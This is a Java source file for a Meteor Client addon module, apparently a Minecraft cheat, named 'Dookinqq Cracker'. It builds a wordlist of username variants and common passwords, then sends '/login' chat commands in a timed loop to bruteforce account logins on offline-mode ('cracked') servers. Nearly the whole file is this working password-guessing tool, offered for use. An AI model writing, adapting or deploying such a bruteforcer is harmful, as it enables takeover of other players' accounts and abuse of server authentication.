package com.example.addon.modules;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;

import java.util.ArrayList;
import java.util.List;

public class SnowCracker extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> delay = sgGeneral.add(new IntSetting.Builder()
            .name("delay")
            .description("Delay between passwords (in ms).")
            .defaultValue(1000)
            .min(1)
            .sliderMax(5000)
            .build()
    );

    private final List<String> passwords = new ArrayList<>();
    private Thread thread = null;

    public SnowCracker() {
        super(AddonTemplate.CATEGORY, "Dookinqq Cracker", "CRYSTAL || Attempts to bruteforce the login on cracked servers.");

        String username = mc.getSession().getUsername();
        passwords.add(username);
        passwords.add(username + "1");
        passwords.add(username + "12");
        passwords.add(username + "123");
        passwords.add(username + "12345");
        passwords.add(username + "123456");
        passwords.add(username + "1234567");
        passwords.add(username + "password");
        passwords.add(username + "_password");
        passwords.add(username + "_");
        passwords.add(username + "@");
        passwords.add(username + "@1");
        passwords.add(username.toLowerCase());
        passwords.add(username.toUpperCase());
        passwords.add("_" + username);
        passwords.add("__" + username);
        passwords.add(username + "__");
        passwords.add("1" + username);
        passwords.add("12" + username);
        passwords.add("123" + username);
        passwords.add(username + "_qwerty");

        passwords.add("password");
        passwords.add("password1");
        passwords.add("password123");
        passwords.add("PASSWORD");

        passwords.add("123");
        passwords.add("1234");
        passwords.add("12345");
        passwords.add("123456");
        passwords.add("1234567");
        passwords.add("12345678");
        passwords.add("123456789");
        passwords.add("1234567890");
        passwords.add("123123");
        passwords.add("123321");
        passwords.add("111111");
        passwords.add("222222");
        passwords.add("000000");
        passwords.add("654321");

        passwords.add("qwerty");
        passwords.add("qwerty123");
        passwords.add("qwertyuiop");
        passwords.add("1q2w3e4r");
        passwords.add("1q2w3e4r5t");
        passwords.add("1qaz2wsx");
        passwords.add("zaq12wsx");
        passwords.add("asdfghjkl");

        passwords.add("abc123");
        passwords.add("iloveyou");
        passwords.add("hello");
        passwords.add("hello123");
        passwords.add("hello123456");
        passwords.add("letmein");
        passwords.add("dragon");
        passwords.add("sunshine");
        passwords.add("princess");
        passwords.add("superman");
        passwords.add("monkey");
        passwords.add("computer");
        passwords.add("football");
        passwords.add("admin");

        passwords.add("fuckyou");
        passwords.add("FUCKYOU");

        passwords.add("6b6t");
        passwords.add("8b8t");
        passwords.add("2b2t");
        passwords.add("popbob");
        passwords.add("stash");
        passwords.add("anarchy");
        passwords.add("dupe");
        passwords.add("glock");
        passwords.add("scam");
        passwords.add("getoutofmyaccount");

        passwords.add("27653");
    }

private void workerLoop() {
    for (String pw : passwords) {
        if (!running) break; // stop if deactivated

        // Example: sending command (replace with safe testing!)
        mc.player.networkHandler.sendChatCommand("login " + pw);

        try {
            Thread.sleep(delay.get());
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            break;
        }
    }
}

private volatile boolean running; // signals the thread to stop

@Override
public void onActivate() {
    running = true;
    thread = new Thread(this::workerLoop); // now this works
    thread.start();
}

@Override
public void onDeactivate() {
    running = false;
    if (thread != null) {
        thread.interrupt();
        thread = null;
    }
}

    public void bruteforce() {
        for (String pw : passwords) {
            mc.player.networkHandler.sendChatCommand("login " + pw);
            try {
                Thread.sleep(delay.get().longValue());
            } catch (InterruptedException ignored) {
            }
        }
    }

    @EventHandler
    public void onGameLeft() {
        toggle();
    }
}


